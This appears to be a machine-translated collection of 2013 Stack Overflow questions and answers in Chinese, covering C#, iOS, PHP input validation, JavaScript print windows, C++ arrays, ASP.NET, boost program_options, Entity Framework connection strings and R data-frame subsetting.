public string dataValue {get;set;}
public string combinedValue {get;set;}
} 
```

不，你可以像这样使用，

```
var listCombo= List1.Where(a=>DataIds.Contains(a.dataId)).DefaultIfEmpty()
    .Join(List2,
    list1 => list1.key,
    list2 => list2.key,
    (L1,L2) => new List1
    {
       dataId = L2.dataId,
       dataValue = L2.dataValue
       combinedValue =  L2.dataId + " - " L2.dataValue
    }); 
```

# ios - 如何在 UIViewController 中获取 UIView 的帧坐标？

> ID：14903695
> 
> 赞同：0
> 
> 时间：2013-02-15T21:35:36.063
> 
> 标签：ios, objective-c

我只是想获取 UIViewController 中包含的 UIView iVar 的帧坐标。例如，如果but0是iVar，并且这个fcn是从ViewController的ViewDidLoad方法中调用的：

```
CGFloat x = self.but0.frame.origin.x; 
```

无论使用 Interface Builder 将按钮放置在何处，这始终返回 0。我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:47:31.887

编辑： Spectravideo328 是对的，你应该使用`viewWillAppear`or `viewDidAppear`。

您可以尝试从 UIView 转换框架。
就像是：

`CGRect frame = [self.view convertRect:btn.frame fromView:tableView.frame];`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:47:22.770

ViewDidLoad 加载视图，但尚未设置框架/边界。ViewDidAppear 保证在设置框架/边界后发生。使用那个方法。

# java - 在 ibm commerce 中，用户可以在订单中拥有的最大商品数量是多少？

> ID：14903701
> 
> 赞同：0
> 
> 时间：2013-02-15T21:35:53.167
> 
> 标签：java, e-commerce, websphere

IBM Websphere 商务 6

我有一个用户在一个订单中有超过 500 个独特的项目。这些是与 IBM DB2 中的 ORDERS 表相关联的 OrderItem。

显然他们无法加载购物清单？我想知道订单可以拥有的项目数量是否有上限，或者当列表开始出现性能问题时数量会是多少。

我还没有找到任何文档。我找到了有关限制购物清单中的项目数量以及为大型清单添加性能改进的文档，但它们没有定义什么是大型清单

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-25T20:24:23.500

请参阅下面的链接，它描述了如何在 wcs 7 [http://pic.dhe.ibm.com/infocenter/wchelp/v7r0m0/topic/com.ibm.commerce.admin.doc/tasks/toscfgbounds.htm中实现相同的功能](http://pic.dhe.ibm.com/infocenter/wchelp/v7r0m0/topic/com.ibm.commerce.admin.doc/tasks/toscfgbounds.htm)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T01:01:01.060

我听说过上限，但我不知道它是什么。我会联系 IBM 软件支持，他们可以告诉您。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-11T07:28:46.180

如果您使用这些项目点击 OrderItemAdd URL，是的，您将受到限制，因为查询字符串仅限于 HTTP GET 请求（可以在 Web 服务器配置中进行配置）WebSphere Commerce 配置有最大数量可以在安装级别和合同级别添加到购物车的订单项目。您可以验证您的方案是否不属于那里。

# php - 是否可以从表单中过滤一组选择值？

> ID：14903704
> 
> 赞同：0
> 
> 时间：2013-02-15T21:36:11.143
> 
> 标签：php

假设我有这个表格：

```
<form method="post">
  <select name="s[]" multiple="multiple">
    <option value="12345678">One</option>
    <option value="a7e6b65e">Two</option>
    <option value="ad2445f7">Three</option>
    <option value="998d64fe">Four</option>
  </select>
  <input type="submit" value="GO">
</form> 
```

提交表单后，我可以使用其中一个[过滤器功能](http://www.php.net/manual/ref.filter.php)来确保数据正常吗？我的第一个想法是`filter_input_array`，但我不认为是这样。

我看到的唯一方法是首先检查我是否有一个数组，然后循环遍历这些值：

```
$s_clean = array();
if (isset($_POST['s']) && is_array($_POST['s'])) {
  foreach ($_POST['s'] as $o) {
    $s_clean[] = filter_var($o, FILTER_VALIDATE_REGEXP, array('options' => array('regexp' => '/^[0-9a-f]{8}$/')));
  }
} 
```

有没有更简单的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:43:08.890

您应该已经在数组中拥有所有可能的选项值。只需验证在帖子中检索到的选项是否在数组中定义。

```
if (!in_array($o, $options)) {
    //Throw some validation error here
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:43:37.813

是的，请参阅 array_filter：http: [//php.net/manual/en/function.array-filter.php](http://php.net/manual/en/function.array-filter.php)

在 PHP 5.4 中你可以做

```
$s=$_POST['s']; 
if (!$s || !is_array($s) 
   $s=array();
else 
   $s=array_filter($s, function ($value)  { return preg_match('/regex/',$value); }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-18T13:27:59.960

感谢 Bram 和 b7kich，他们每个人都为我提供了我将使用的解决方案的一部分，因为过滤器功能似乎在这里没有帮助。

列出可能值的想法很棒（doh！），并且通过查看`array_*`我发现的函数`array_intersect`，它会过滤掉任何非“有效”值。

```
$valid = array('12345678','a7e6b65e','ad24d5f7','998d64fe');
if (!isset($_POST['s']) || !($s = $_POST['s']) || !is_array($s))
  $s_clean = array();
else 
  $s_clean = array_intersect($s, $valid); 
```

# c# - 正则表达式从 .sql 文件 C# 中的 DDL 解析存储过程和对象名称

> ID：14903705
> 
> 赞同：0
> 
> 时间：2013-02-15T21:36:11.147
> 
> 标签：c#, regex, parsing, sql-parser, tsql-parser

我有一个 .sql 文件，其中可能包含几个存储过程的 DDL 定义、表、触发器、视图等的更改语句

它可能有这样的陈述：

*   创建过程/创建过程
*   改变程序/改变程序
*   丢弃过程/丢弃过程
*   创建表/触发器/视图
*   更改表/触发器/视图
*   拖放表/触发器/视图
*   ETC

解析 .sql 文件并获取对象列表（Proc/Table/View 名称）以及对它们执行的操作（ALTER/CREATE/DROP）的最佳方法是什么？我想代替使用 Microsoft.Data.Schema.ScriptDom 或 ANTLR 或其他解析器之类的东西，最简单的方法是使用 RegEx。但不确定我应该写什么样的正则表达式来涵盖所有场景。

到目前为止，这个表达式能够匹配上述所有规则。但是我如何获得它前面的对象的名称。例如。它匹配

> (create|alter|drop)\s+(procedure|proc|table|trigger|view|function|constraint)

如何获得 AdvisorGroups 的名称是我的问题。我的 RegEx 也不完美，因为它可能有 [dbo]。在它面前与否。它也可能只是 Alter table AdvisorGroups。我并不是要照顾所有的可能性。只是最低限度。

> ALTER TABLE [dbo].[AdvisorGroups] 添加约束 [XXX]

-提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:49:03.517

RegEx 无法完成工作 - 绝对......您将需要一个真正的解析器 - 就像[这个](http://www.sqlparser.com/sql-parser-dotnet.php)（商业）一样。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T23:30:08.210

我自己解决了。希望它可以帮助某人。所以对于一个包含 ALTER、DROP、CREATE PROC/TABLE/TRIGGER/FUNCTION 的字符串

```
 Regex DDL = new Regex(@"(?<=\b(create|alter|drop)\s+(procedure|proc|table|trigger|view|function)\b\s\[dbo\].)\[.*?\]", RegexOptions.IgnoreCase);
    Match match = DDL.Match(inputScript);
    while(match.Success)
    {
        textBox2.Text += "\r\n" + match.Groups[1].Value + " - " + match.Groups[2].Value + " - " +  match.Value;
        match = match.NextMatch();
    }
    textBox3.Text = "DONE"; 
```

你会得到这样的输出。

*   创建 - 视图 - vwEmployees
*   创建 - 表 - tblSalaries
*   DROP - PROC - spGetEmployees
*   ALTER - 表 - tblSalaries

这段代码的精彩之处在于，它不仅为您提供了受影响的对象，而且还为您提供了对象的种类（即表、过程、视图）和操作（例如创建/更改/删除）。所有这些都在matches[1]、matches[2]等中可用。

# javascript - 使用javascript将父窗口的CSS添加到子窗口

> ID：14903708
> 
> 赞同：2
> 
> 时间：2013-02-15T21:36:25.537
> 
> 标签：javascript

我正在尝试生成一个弹出窗口，其中包含主窗口一小部分的可打印版本。我正在使用 Meteor，因此 HTML 和 CSS 文件都是以编程方式生成的。

我想做的是使用 Javascript 读取父窗口中所有链接的 CSS 文件并将它们附加到子窗口。

```
var childWindow = window.open("", "_blank", "width=350,height=150");
var childDoc    = childWindow.document;
var childHead   = childDoc.getElementsByTagName("head")[0];

$('link').each(function(index,element){
  childLink = childDoc.createElement("link");
  childLink.rel  = "stylesheet";
  childLink.href = element.href;
  childHead.appendChild(childLink);
});
childDoc.write(myHtml); 
```

但它不起作用。似乎`childHead`是指父文档的头部，而不是子文档。我不确定这是否是我正在运行的安全问题，或者只是代码中有错误。

任何想法我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-18T17:27:32.593

我在我的一个页面上做了一件非常相似的事情。我只是使用“父”页面来编写所有内容，并且工作正常。这是它对我的工作方式。看到[这个小提琴](http://jsfiddle.net/7dzCz/1/)在行动。您会注意到它只打印来自`printMe`div 的内容。此外，打印页面具有与父页面完全相同的脚本和样式。

```
some stuff NOT to print
<div id="printMe" class="ui-selectable-helper">
    I should be printed, but not the other stuff.
</div>
more stuff NOT to print

$(function(){
    var printWindow = window.open('', 'printWin', 'height=600, width=900, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, directories=no, status=no');

    //create a new HEAD with the exact same content as the main page
    var writeMe = ('<body><head>' + $('head').html() + '</head><html>');

    //grab the content of the printMe div and use it on the print page
    writeMe += ("<div>" + $('#printMe')[0].outerHTML + "</div>");
    writeMe += ('</html></body>');    
    printWindow.document.write(writeMe);
    printWindow.document.close();    
    printWindow.focus();
    printWindow.print();  

    //you might even use this next line if you want the 'popup' window to go away as soon as they have finished printing.
    //printWindow.close();
}); 
```

注意：我只是用`class="ui-selectable-helper"`来向您展示确实 CSS 页面正在正确地传输到新的弹出窗口。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-18T20:05:38.080

最终对我有用的是在身体上附加一些东西`childDoc.write(myHtml);`

在此之前，CSS 不会加载，但是一旦我实际传入了几个 div，CSS 就显示出来了，没有任何其他修改。

# text - 哪种方法是持久化字符串以检索文本跨度的最有效方法？

> ID：14903712
> 
> 赞同：0
> 
> 时间：2013-02-15T21:36:49.833
> 
> 标签：text, data-structures, nosql, bigdata, storage-engines

我需要一种在磁盘上只存储一个大文本而不将其完全加载到内存中的方法。

我的查询是文本跨度的形式，例如：给我位置 x 和位置 x + n 之间的所有文本，不多也不少。我没有经常更改文本。

可能我需要像“持久” B-Tree 这样的东西。

它还需要一些 DBMS 功能，例如：

*   客户端/服务器架构
*   缓存系统

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T16:59:54.597

> 它还需要一些 DBMS 功能，例如：...

那么，为什么不使用 DBMS 呢？甚至是具有查询功能的 NoSQL 解决方案，例如 OrientDB？

我认为你可以做这样的事情。

1.  将文本分成块（章节？段落？固定大小？）
2.  将您的文本保存在包含（至少）三个字段的表中：
    TEXT（文本块）
    BEGIN（该块距全文开头的偏移量）
    END（该块距全文开头的结束偏移量）

现在您可以编写查询来提取位置 x 和位置 x+n 之间的文本。

```
SELECT TEXT, BEGIN END  
  FROM TEXT_TABLE  
 WHERE END >= x  
   AND BEGIN <= (x+n)  
ORDER BY BEGIN 
```

最后，您只需提取文本，执行以下操作：
- 从第一行：substring(TEXT, (x-BEGIN))
- 从“内部”行：所有 TEXT
- 从最后一行：substring(TEXT, 0, (x+ n-开始））

显然，您还应该注意“边缘情况”（结果只有一两行，请求的跨度超出范围，......）。
但我认为这种方法应该不用太多努力就可以解决你的问题。

希望能帮助到你。
再见，
*拉夫*

# c++ - 对数组中的对象使用 delete []

> ID：14903714
> 
> 赞同：0
> 
> 时间：2013-02-15T21:37:06.870
> 
> 标签：c++

如何在数组中的特定类对象上使用 delete 来仅删除该对象而不是整个数组？

这个对象将不管在数组的末尾是什么，因此移动数组中的其他对象也无关紧要

编辑：

为了更清楚，我只想释放数组的最后一个元素以供以后使用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:44:58.373

`std::vector`如果您需要这样做，您应该使用而不是常规数组。使用`std::vector`，删除和销毁最终元素是通过该`pop_back`方法完成的。

如果您绝对必须使用常规数组，并且必须立即销毁数组中的一个对象，则可以放置-销毁该对象，然后在其位置构造一个新对象。如果您不确定这意味着什么或如何做，您可能应该`std::vector`改用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:44:19.223

用指令分配的数组`new[]`只能用`delete[]`指令释放。`free`任何其他释放部分或整个数组（等）的尝试`delete`都是未定义的行为。如果您希望能够释放数组中的特定元素，那么您最好考虑使用 stl 容器，例如`std::vector`, `std::list`,`std::set`等`std::map`。每个都有不同的属性并且适用于不同的任务，但都支持快速删除元素（除了`vector`它只支持最后一个元素的“快速”删除，但因为这正是你想要的，所以它是一个不错的选择）并且实际上为你“隐藏”了元素的分配。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T21:41:47.203

如果要将数组的最后一个元素复制到其他地方，只需执行此操作，然后忽略最后一个元素。您无法删除它。通常，您在某处有一个计数器变量，用于保存当前数组中的元素数量。因此，当您“删除”最后一个元素时，只需将该计数器减 1。

仅供参考，`std::vector`工作方式完全相同。（无论如何，你应该`std::vector`开始使用。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-15T21:44:44.600

如果数组像

```
object* array = new object[n]; 
```

然后你不能删除它的一个元素。您可以使用 移动元素`memcpy()`，但不能更改数组的大小。

在大多数情况下，在数组项上使用`new`或会导致堆损坏。`delete`按照建议，您应该使用`std::vector`.

如果数组是指向对象的指针数组，那么您可以`delete`指向对象*，但*不能删除指针本身（请参阅此答案的第一部分）。

编辑：问题作者的评论指出他想删除指针数组的最后一个元素。

您可以将最后一个指针设置为 0 并检查：

```
pointers[size - 1] = 0;
// later, when using the array
if(pointers[i]) // do smth 
```

使用`std::vector`会更容易。此外，如果您的删除频率足够高，您应该考虑使用`std::list`.

# ios - iOS 应用程序：在表格视图发生重新加载数据时忽略屏幕尺寸编码

> ID：14903718
> 
> 赞同：0
> 
> 时间：2013-02-15T21:37:16.007
> 
> 标签：ios, cocoa-touch

我在为不同的屏幕尺寸编码时遇到问题。我正在以编程方式检查屏幕大小，如果检测到更大的屏幕，然后调整表格高度，否则布局设置为标准 iPhone 布局。检测到较大的屏幕尺寸并适当调整表格尺寸。当我在表上执行“reloadData”时，视图将恢复为较小尺寸的表。尺寸检查代码是单步执行的，但似乎被忽略了？当我切换到另一个选项卡然后返回到有问题的选项卡时，屏幕会用更大尺寸的表格重新绘制。下面是我用于屏幕检查的代码和一些显示变化的表格大小的屏幕截图。代码太多，无法发布所有内容。在此先感谢，有什么想法吗？

```
-(void)screenCheck
{
    // detecting screen size
    if (([UIScreen mainScreen].scale == 2) && ([[UIScreen mainScreen] bounds].size.height == 568))
    {
        // retina 4" screen
        // changing table height
        tableVerseView.frame = CGRectMake(tableVerseView.frame.origin.x, 215, tableVerseView.frame.size.width,260);
    }
} 
```

![截屏](../Images/52729b76a1273d383fa69886791d9744.png)

![截屏](../Images/925e0e37b364f1ddaf9c194a7837a716.png)

** 调用代码的部分。还有很多其他的，主要是每次执行“reloadData”时

```
-(void)viewDidAppear:(BOOL)animated
{
    [super viewDidAppear:animated];

    // reloading table data
    [self loadVerses];
    [self.tableVerseView reloadData];

    // testing for no verses available
    if ([tableVerseData count] > 0)
    {
        // selecting the previously selected table row
        NSIndexPath *indexPath = [NSIndexPath indexPathForRow:array_pos inSection:0];
        [tableVerseView.delegate tableView:tableVerseView didSelectRowAtIndexPath:indexPath];
    }
    else
    {
        // clearing table view because there are no verses left
        labelVerseText.text = @"You need to add a new Verse to your 'New Verses' Challenge List.";
        labelVerseTitleOpen.text = @"Verse Title";
        labelVerseDaysOpen.text = @"Day Count";
    }

    // screen resolutution check
    [self screenCheck];
} 
```

# c# - asp:hyperlink 未在服务器上呈现正确的 HTML

> ID：14903724
> 
> 赞同：1
> 
> 时间：2013-02-15T21:37:24.213
> 
> 标签：c#, webforms

我正在开发一个在 .NET 2.0 上的 ASP.NET WebForms 中的项目，并且遇到了一个我似乎找不到原因的问题。我的 aspx 文件中有以下代码：

```
 <table>
            <tr>
                <td>

                    <asp:HyperLink ID="supportLink" runat="server">Customer Support Docket</asp:HyperLink>
                </td>
            </tr>

            <tr>
                <td>
                    <asp:HyperLink ID="entitlementsLink" runat="server">Edit Entitlements</asp:HyperLink>
                </td>
            </tr>
        </table> 
```

当我在调试模式下本地运行时，它工作得很好。链接出现并且 HTML 被正确呈现，如下所示：

***本地呈现的 HTML***

```
<table>
    <tr>
        <td>

            <a id="ctl00_ContentMain_supportLink" href="ViewCustomer.aspx?customerid=659">Customer Support Docket</a>
        </td>
    </tr>

    <tr>
        <td>
            <a id="ctl00_ContentMain_entitlementsLink" href="EditEntitlements.aspx?customerid=659">Edit Entitlements</a>
        </td>
    </tr>
</table> 
```

但是，当我在生产服务器上运行它时，会生成以下 HTML：

***服务器呈现的 HTML***

```
 <table>
        <tr>
            <td>

                <a id="ctl00_ContentMain_supportLink">Customer Support Docket</a>
            </td>
        </tr>

        <tr>
            <td>
                <a id="ctl00_ContentMain_entitlementsLink">Edit Entitlements</a>
            </td>
        </tr>
    </table> 
```

如您所见，两者都缺少 href。在我后面的代码中，我添加了 URL，因为我很难让它们在 aspx 文件中正确呈现：

***代码隐藏文件***

```
 protected void Page_Load(object sender, EventArgs e)
    {
        supportLink.NavigateUrl = string.Format("ViewCustomer.aspx?customerid={0}",
                                                Request.QueryString["customerid"]);
        entitlementsLink.NavigateUrl = string.Format("EditEntitlements.aspx?customerid={0}",
                                                     Request.QueryString["customerid"]);
    } 
```

在这一点上，我不确定我能做什么。我的计划是在接下来的几周内用 MVC4 重写这个站点，但由于这是一个内部站点并且不会产生资金，所以它在我的优先级列表中的位置很低，并且暂时不会得到更多关注，这意味着我需要来解决这个问题。

服务器环境是 Windows Server 2003 上的 IIS 6，HTML 在 IE9 和 Chrome 24.0.1312.57 中都以这种方式呈现。我已经清除了两个浏览器中的缓存但无济于事，并且我知道该页面在发布后会更新，因为我添加的具有相同更改的其他功能实际上正在生产中工作。

***编辑***

[Rezalas](https://stackoverflow.com/a/14903824/509746)想知道我从哪里得到客户 ID。它来自查询字符串。为了显示一个空白的查询字符串不会导致这种情况，这里是没有查询字符串的本地和生产 HTML：

***没有查询字符串的本地渲染***

```
<table>
    <tr>
        <td>

            <a id="ctl00_ContentMain_supportLink" href="ViewCustomer.aspx?customerid=">Customer Support Docket</a>
        </td>
    </tr>

    <tr>
        <td>
            <a id="ctl00_ContentMain_entitlementsLink" href="EditEntitlements.aspx?customerid=">Edit Entitlements</a>
        </td>
    </tr>
</table> 
```

***没有查询字符串的生产 HTML***

```
<table>
    <tr>
        <td>

            <a id="ctl00_ContentMain_supportLink">Customer Support Docket</a>
        </td>
    </tr>

    <tr>
        <td>
            <a id="ctl00_ContentMain_entitlementsLink">Edit Entitlements</a>
        </td>
    </tr>
</table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:45:12.820

为了澄清，customerid值来自哪里？您确定在服务器上运行时的值被正确提取吗？我这样说是因为它看起来好像没有提供 ID，因此没有构建字符串并且导航 url 被排除在外，因为它没有值。

# c++ - boost::program_options 在其他地方使用implicit_value 时崩溃

> ID：14903725
> 
> 赞同：1
> 
> 时间：2013-02-15T21:37:41.450
> 
> 标签：c++, boost-program-options

我有以下代码片段来接受运行时程序选项。只要我在命令行上没有 --help 一切都运行良好。在调用 --help 我收到

malloc: *** 对象 0x7fff7b646570 的错误：未分配被释放的指针 ***在 malloc_error_break 中设置断点以进行调试

在 boost::any::holder 类上。如果删除了implicit_value 设置，一切正常（即使使用--help）。我在这里错过了什么吗？

TIA，尼基尔

```
// program options descritor
po::options_description allOpts("");
// general
po::options_description genOpt("General options");
genOpt.add_options()
("help", "produce help message")
;

// mandatory options
po::options_description manOpt("Mandatory options");
manOpt.add_options()
("tilesetData", po::value<std::string>()->required(),
 "tile set image file (required)")
;

// modifiables
po::options_description modifiers("Modifiable options");
modifiers.add_options()
("takeSnaps", po::value<std::string>()->implicit_value("gameShots"),
 "take screen shots after every display refresh")
("music", po::value<std::string>()->implicit_value("NOT_SPECIFIED.mp3"),
 "play the music specified by the file")
;

// compile all options
allOpts.add(genOpt).add(manOpt).add(modifiers);
// parse command line
po::variables_map vm;
po::store(po::parse_command_line(argc, argv, allOpts), vm);

// create help message
if (vm.count("help")) {
    std::cout << allOpts << std::endl;;
    return false;
}

// check program options
try {
    po::notify(vm);
}

catch (std::exception& e){
    std::cerr << "Error: " << e.what() << std::endl;
    return false;
}
catch(...){
    std::cerr << "Unknown error!" << std::endl;
    return false;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:51:59.130

我怀疑这是由于编译器版本之间的不兼容造成的。您使用的 boost 版本可能是使用比您用于编译程序的版本更旧的 gcc 版本编译的。解决方案是使用相同的编译器来构建 boost 并编译您的程序。

# c# - 未找到连接字符串，但仅在设计时

> ID：14903727
> 
> 赞同：4
> 
> 时间：2013-02-15T21:37:45.383
> 
> 标签：c#, wpf, data-binding, visual-studio-2012, objectdataprovider

嗨，我对 WPF 和 C# 还很陌生，所以如果这只是一个愚蠢的问题，请不要客气：

我正在使用 VS2012，Entity Framework 来创建预先存在的数据库的模型，我想将一些表绑定到一些 ListView ......现在，我知道有不同的方法可以做到这一点，但是当我尝试使用ObjectDataProvider 我在设计时收到错误“在应用程序配置文件中找不到名为 ... 的连接字符串”。

奇怪的是，如果我运行我的应用程序一切正常，我只想删除那个丑陋的错误消息，并希望在我的列表广告设计时获取数据（这就是我想使用 objectdataprovider 的原因）。

以下是我的代码的一些部分：

**应用程序配置：**

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <connectionStrings>
    <add name="BibliotecaEntities" 
         connectionString="metadata=res://*/Model1.csdl|res://*/Model1.ssdl|res://*/Model1.msl;provider=System.Data.SqlClient;provider connection string='data source=(LocalDB)\v11.0;attachdbfilename=&quot;G:\PROGETTI-SOFTWARE\c# tests\Biblioteca\Biblioteca\biblioteca-db.mdf&quot;;initial catalog=BibliotecaDB;integrated security=True;MultipleActiveResultSets=True;App=EntityFramework'" 
         providerName="System.Data.EntityClient" />
  </connectionStrings>
</configuration> 
```

**ListaScaffali.xaml：**

```
<Window x:Class="Biblioteca.ShelvesList"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:local="clr-namespace:Biblioteca;assembly=" 
        Title="ShelvesList" Height="341" Width="609">

    <Window.Resources>
        <ObjectDataProvider ObjectType="{x:Type local:BooksDB_Handler}" MethodName="TuttiGliScaffali" x:Key="ScaffaliObjSrc" />
    </Window.Resources>

    <Grid>
        <Grid>
            <ListView Name="listaScaffali" ItemsSource="{Binding Source={StaticResource ScaffaliObjSrc}}">
                <ListView.View>
                    <GridView>
                        <GridViewColumn Header="Scaffali Disponibili:" DisplayMemberBinding="{Binding Scaffale}" />
                    </GridView>
                </ListView.View>
            </ListView>
        </Grid>
    </Grid>
</Window> 
```

**BooksDB-Handler.cs：**

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Configuration;
using System.Data.Entity;
using System.Collections.ObjectModel;

namespace Biblioteca
{
    public static class BooksDB_Handler
    {

    ...

        public static ObservableCollection<Scaffali> TuttiGliScaffali()
        {
            using (var ctx = new BibliotecaEntities())
            {

                var reader = from d in ctx.Scaffali
                             select d;
                return new ObservableCollection<Scaffali>(reader);
            }
        }

    ...

    }
} 
```

在我的数据库中，表“Scaffali”只有两列：“ScaffaliID”（身份）和“Scaffale”。

我在某处读到这可能是 Visual Studio 错误并尝试了各种方法：

1.  重建几次
2.  避免 # 在路径中
3.  编译为 32 位（我正在运行 Win8 x64）

但是直到现在还没有运气...

感谢您的友好回答。

-= 2013 年 4 月 3 日更新 =-

到目前为止，我仍然没有找到导致这种奇怪行为的条件，无论如何我发现如果我只是按顺序构建（而不是重建）两次，错误消息就会消失，一切似乎都可以正常工作......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:56:50.053

我遇到了同样的问题，我发现在设计时，IDE 似乎没有读取 App.config 来获取连接字符串，因此在建立连接时它会爆炸。我最终做的是检查代码是否在设计时并手动创建一些用于设计目的的项目。

我使用以下代码来确定环境是否处于设计模式：

```
public static bool IsInDesignMode
{
    get
    {
        #if Silverlight
            return !HtmlPage.IsEnabled;;
        #else
            return DesignerProperties.GetIsInDesignMode(new DependencyObject());
        #endif
    }
} 
```

然后在我返回项目的代码中，我执行以下操作：

```
if (IsInDesignMode)
{
    GetSampleData();
}
else
{
    GetQueryData();
} 
```

我只是实现了这两种方法。

可能有更好的解决方案，但这对我来说效果很好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-04-28T16:24:32.873

这个解决方案看起来很有希望，但我还没有让它为我工作......

资料来源：http: [//developernote.com/2012/03/rich-design-time-experience-with-wpf-and-ef-in-visual-studio-2010/](http://developernote.com/2012/03/rich-design-time-experience-with-wpf-and-ef-in-visual-studio-2010/)

有时，在设计时查看数据的能力极大地促进了 WPF 控件的创建。如果我正在使用数据绑定控件开发具有复杂 UI 的 WPF 控件，我通常会定义一个属性来访问一些典型的数据项：

```
public static ComplexData DesignTimeItem
{
    get
    {
        using (DatabaseContext db = new DatabaseContext())
        {
            var products = from p in db.products.Include("ProductType")
                           where p.product_id == 131
                           select p;

            product product = products.First();

            return new ComplexData(product, "100 kg");
        }
    }
} 
```

然后我在设计时直接在 XAML 中使用这个属性：

```
<UserControl x:Class="SomeControl"
    ...
    xmlns:local="clr-namespace:ControlNamespace"
    DataContext="{Binding Source={x:Static local:ComplexData.DesignTimeItem}, Mode=OneWay}"
    ...
> 
```

然后我需要做最后一步。问题是默认实体上下文构造函数（DatabaseContext）使用运行时应用程序配置文件 app.config 中包含的连接字符串：

```
<connectionStrings>
  <add name="MyContext" connectionString="metadata=res://*/MyModel.csdl|res://*/MyModel.ssdl|res://*/MyModel.msl;provider=MySql.Data.MySqlClient;provider connection string=&quot;password=******;User Id=myuser;server=myserver;database=mydb;Persist Security Info=True;charset=utf8&quot;" providerName="System.Data.EntityClient"/>
</connectionStrings> 
```

但是在设计时，应用程序配置文件是**devenv.exe.config**，它不包含连接字符串，因此我的 WPF 控件的创建失败导致设计器无法加载。为了解决这个问题，我只需将**app.config**中包含的连接字符串复制到位于**“C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE\”中的****devenv.exe.config**并重新启动 Visual Studio。

 *** * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-16T01:49:25.440

您是否尝试过自己使用 ConnectionString 构造 DataContext 对象，而不是让框架使用配置文件中指定的对象？我通常更喜欢自己构建该对象，因此我可以轻松地将其移动到另一个程序集并注入连接依赖项。不过那是另一回事了。就您而言，我建议您尝试以下方法：

1.  在 webconfig 中保留连接字符串。
2.  自己构建上下文

    var connectionStringBuilder = new EntityConnectionStringBuilder { Metadata = "{metadata}", Provider = "{provider}", ProviderConnectionString = "{connection string from config}" };

    var ctx = new BibliotecaEntities(connectionStringBuilder.ToString());

我只是给个提示，你可以试试。我还没有尝试过完整的细节。希望能帮助到你。**

# r - 删除数据帧行的简单方法对没有行匹配删除条件的实例具有鲁棒性

> ID：14903728
> 
> 赞同：7
> 
> 时间：2013-02-15T21:37:54.997
> 
> 标签：r

R 中数据操作的一项常见任务是通过删除符合特定条件的行来对数据帧进行子集化。但是，在 R 中执行此操作的简单方法似乎在逻辑上不一致，甚至对于没有经验的人（比如我自己）来说也是危险的。

假设我们有一个数据框，我们想要排除属于“G1”处理的行：

```
Treatment=c("G1","G1","G1","G1","G1","G1","G2","G2","G2","G2","G2",
"G2","G3","G3","G3","G3","G3","G3")
Vals=c(runif(6),runif(6)+0.9,runif(6)-0.3)
data=data.frame(Treatment)
data=cbind(data, Vals) 
```

正如预期的那样，下面的代码删除了与第一行条件匹配的数据帧行

```
to_del=which(data$Treatment=="G1")
new_data=data[-to_del,]
new_data 
```

但是，与预期相反，如果“which”命令未找到任何匹配的行，则使用此方法，此代码将删除所有行而不是单独保留它们

```
to_del=which(data$Treatment=="G4")
new_data=data[-to_del,]
new_data 
```

上面的代码导致数据框没有剩余行，这是没有意义的（即，由于 R 没有找到符合我的删除条件的行，因此它删除了所有行）。我的解决方法可以完成这项工作，但我想有一种更简单的方法可以在没有所有这些条件语句的情况下做到这一点

```
###WORKAROUND
to_del=which(data$Treatment=="G4") #no G4 treatment in this particular data frame
if (length(to_del)>0){
  new_data=data[-to_del,]  
}else{
  new_data=data
}
new_data 
```

有没有人有一个简单的方法来做到这一点，即使没有行匹配指定的条件？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-15T21:40:33.537

您偶然发现了使用`which`. 改为使用`!=`。

```
new_data <- data[data$Treatment!="G4",] 
```

问题是`which`如果`integer(0)`所有元素都是`FALSE`. 即使`which`返回，这仍然是一个问题，`0`因为零子集也返回`integer(0)`：

```
R> # subsetting by zero (positive or negative)
R> (1:3)[0]  # same as (1:3)[-0]
integer(0) 
```

如果您按以下方式进行子集化，您也会遇到问题`NA`：

```
R> # subsetting by NA
R> (1:3)[NA]
[1] NA NA NA 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-15T22:09:39.340

为什么不使用`subset`？

```
subset(data,  ! rownames(data) %in% to_del ) 
```

（无论如何，您在示例中隐式匹配行名`data[-to_del, ]`。）当然，一旦可行，您可以返回仅使用“[”

```
data[  ! rownames(data) %in% to_del , ] 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-16T14:03:31.213

我喜欢使用`data.table`子集，因为它更直观、更短，并且在大型数据集上运行更快。

```
library(data.table)
data.dt<-as.data.table(data)
setkey(data.dt, Treatment)

data.dt[!"G1",]
##     Treatment        Vals
##  1:        G2  0.90264622
##  2:        G2  1.47842130
##  3:        G2  1.52494735
##  4:        G2  1.46373958
##  5:        G2  1.12850658
